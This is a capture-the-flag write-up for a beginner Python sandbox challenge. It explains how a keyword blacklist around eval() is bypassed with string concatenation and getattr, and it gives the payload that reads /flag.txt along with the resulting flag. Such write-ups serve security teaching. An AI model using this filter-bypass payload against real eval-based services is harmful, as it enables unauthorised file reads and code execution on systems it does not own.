# Python Sandbox 101 - Solution Writeup

## Analysis
The application evaluates user Python expressions via `eval()`.
Before evaluation, it checks if any blacklisted keyword (`import`, `os`, `system`, `eval`, `exec`, `open`, `read`, `subprocess`) is present in the input string.

## Solution Steps
Because the filter checks for literal string occurrences in the code, we can bypass the check using string concatenation or getattr:
- `'o' + 'pen'` dynamically yields `'open'`
- `'r' + 'ead'` dynamically yields `'read'`

Expression payload:
```python
getattr(getattr(__builtins__, 'o' + 'pen')('/flag.txt'), 'r' + 'ead')()
```

Output:
`flag{pyj41l_b3g1nn3r_3sc4p3_79c1a4}`
